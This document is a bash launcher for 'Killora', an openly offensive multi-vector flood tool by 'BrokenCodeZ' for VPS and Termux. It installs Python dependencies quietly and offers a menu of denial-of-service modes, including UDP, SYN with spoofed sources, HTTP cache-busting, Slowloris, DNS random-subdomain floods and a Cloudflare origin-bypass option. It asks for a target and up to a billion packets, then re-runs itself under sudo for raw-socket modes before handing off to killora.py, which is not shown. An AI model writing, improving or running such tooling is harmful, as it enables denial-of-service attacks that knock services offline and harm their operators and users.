#!/usr/bin/env bash
# ============================================================
#   K I L L O R A        by BrokenCodeZ
#   Multi-vector flood tool  |  VPS + Termux
# ============================================================
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$DIR/killora.py"

C1='\033[1;36m'; C2='\033[1;35m'; C3='\033[1;33m'
C4='\033[1;32m'; CR='\033[1;31m'; DM='\033[2m'; N='\033[0m'

banner() {
  clear
  printf "${C2}"
  cat <<'EOF'
   __ __ _ _ _      ___  ___  ___  _   _
  |  |  | | | | ___| . |  _| . | | | |
  |    <| | | ||___| | | | | | | |_| |
  |_|\__|_____|    |___|_| |___|_____|
EOF
  printf "${N}"
  printf "        ${C1}K I L L O R A${N}  ${DM}by BrokenCodeZ${N}\n"
  printf "  ${DM}UDP . TCP . HTTP . SYN . ACK . TLS . DNS . CF-Bypass${N}\n"
  printf "  ${DM}----------------------------------------------------${N}\n\n"
}

need() { command -v "$1" >/dev/null 2>&1; }

bootstrap() {
  if [ -n "$TERMUX_VERSION" ]; then
    need python3 || pkg install -y python >/dev/null 2>&1
  else
    need python3 || { apt-get update -qq >/dev/null 2>&1; apt-get install -y python3 python3-pip >/dev/null 2>&1; }
  fi
  need python3 || { printf "${CR}python3 missing. Install karo.${N}\n"; exit 1; }
  python3 -c 'import aiohttp' 2>/dev/null || \
    pip3 install --quiet --upgrade aiohttp 2>/dev/null || \
    python3 -m pip install --quiet --upgrade aiohttp 2>/dev/null
  [ -f "$PY" ] || { printf "${CR}killora.py nahi mila $DIR me.${N}\n"; exit 1; }
}

menu() {
  printf "  ${C3}[1]${N}  UDP Flood        ${DM}raw volume, L4${N}\n"
  printf "  ${C3}[2]${N}  TCP Flood        ${DM}connect flood, L4${N}\n"
  printf "  ${C3}[3]${N}  HTTP Flood       ${DM}GET/POST + cache bust, L7${N}\n"
  printf "  ${C3}[4]${N}  SYN Flood        ${DM}spoofed source, root${N}\n"
  printf "  ${C3}[5]${N}  ACK Flood        ${DM}stateless, root${N}\n"
  printf "  ${C3}[6]${N}  TLS Handshake    ${DM}CPU burn on target${N}\n"
  printf "  ${C3}[7]${N}  Slowloris        ${DM}socket hold, L7${N}\n"
  printf "  ${C3}[8]${N}  DNS Query Flood  ${DM}random subdomain${N}\n"
  printf "  ${C3}[9]${N}  ICMP Flood       ${DM}ping flood, root${N}\n"
  printf "  ${C3}[10]${N} Cloudflare Bypass ${DM}origin hunt + header spoof${N}\n"
  printf "  ${C3}[11]${N} Mixed            ${DM}multi-vector ek saath${N}\n"
  printf "  ${C3}[12]${N} Target Checker   ${DM}CF detect + port scan${N}\n"
  printf "  ${CR}[0]${N}  Exit\n\n"
}

DEFPORT=80
ask_all() {
  local mode="$1"
  while :; do
    read -rp "  Target (IP / hostname / URL): " RAW
    [ -n "$RAW" ] && break
    printf "  ${CR}khali nahi chhod sakte${N}\n"
  done
  RAW="${RAW#http://}"; RAW="${RAW#https://}"; RAW="${RAW%%/*}"
  HOST="$RAW"

  if [ "$mode" = "check" ]; then PORT=0; COUNT=0; return; fi

  read -rp "  Port [${DEFPORT}]: " PORT
  PORT="${PORT:-$DEFPORT}"
  while ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; do
    read -rp "  ${CR}galat port.${N} Port [${DEFPORT}]: " PORT
    PORT="${PORT:-$DEFPORT}"
  done

  read -rp "  Flood amount (max 1000000000): " COUNT
  while ! [[ "$COUNT" =~ ^[0-9]+$ ]] || [ "$COUNT" -lt 1 ] || [ "$COUNT" -gt 1000000000 ]; do
    read -rp "  ${CR}1 se 1000000000 ke beech.${N} Amount: " COUNT
  done
}

bootstrap
while :; do
  banner
  menu
  read -rp "  ${C1}Killora >${N} " OPT
  case "$OPT" in
    1)  MODE=udp;  DEFPORT=80;;
    2)  MODE=tcp;  DEFPORT=80;;
    3)  MODE=http; DEFPORT=80;;
    4)  MODE=syn;  DEFPORT=80;;
    5)  MODE=ack;  DEFPORT=80;;
    6)  MODE=tls;  DEFPORT=443;;
    7)  MODE=slow; DEFPORT=80;;
    8)  MODE=dns;  DEFPORT=53;;
    9)  MODE=icmp; DEFPORT=0;;
    10) MODE=cf;   DEFPORT=443;;
    11) MODE=mixed;DEFPORT=80;;
    12) MODE=check;DEFPORT=0;;
    0)  printf "\n  ${C1}bye.${N}\n"; exit 0;;
    *)  continue;;
  esac

  banner
  ask_all "$MODE"

  if [[ "$MODE" =~ ^(syn|ack|icmp|mixed)$ ]] && [ "$EUID" -ne 0 ]; then
    printf "  ${C3}raw mode — root chahiye. sudo me dobara chala raha hu...${N}\n"
    exec sudo -E python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT"
  fi

  printf "\n  ${C4}Target :${N} %s\n  ${C4}Port   :${N} %s\n  ${C4}Amount :${N} %s\n  ${C4}Mode   :${N} %s\n" \
    "$HOST" "$PORT" "$COUNT" "$MODE"
  printf "\n  ${C3}ENTER dabao launch ke liye...${N}"
  read -r _
  exec python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT"
done